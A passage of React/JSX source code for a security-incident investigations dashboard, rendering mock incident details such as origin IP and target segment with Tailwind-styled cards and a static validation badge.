                { label: `Origin Identifier: ${activeIncidentMock.rawLogData.origin_ip}`, sub: activeIncidentMock.rawLogData.threat_intel.context, icon: <Database size={12} /> },
                { label: `Target Segment: ${activeIncidentMock.collection}`, sub: 'Production Infrastructure Assets', icon: <Terminal size={12} /> }
              ].map((item, i) => (
                <div key={i} className="p-3 bg-slate-950/40 border border-slate-800/50 rounded-xl hover:border-indigo-500/50 transition-all cursor-pointer group">
                  <div className="flex items-center justify-between mb-1">
                    <div className="flex items-center gap-1.5 text-[11px] font-bold text-slate-300 group-hover:text-white">
                      <span className="text-slate-500">{item.icon}</span>
                      <span>{item.label}</span>
                    </div>
                    <ExternalLinkIcon size={11} className="text-slate-600 group-hover:text-indigo-400 transition-colors" />
                  </div>
                  <p className="text-[9px] text-slate-500 uppercase tracking-tight font-mono">{item.sub}</p>
                </div>
              ))}
            </div>
          </div>

          <div className="flex items-center justify-center p-4 bg-emerald-500/5 border border-emerald-500/10 rounded-2xl">
            <ShieldCheck size={16} className="text-emerald-500 mr-2 animate-pulse" />
            <span className="text-[10px] font-bold text-emerald-500/80 uppercase tracking-widest font-mono">Validated via Sentinel Core Security AI</span>
          </div>
        </aside>
      </div>
    </div>
  );
};

export default Investigations;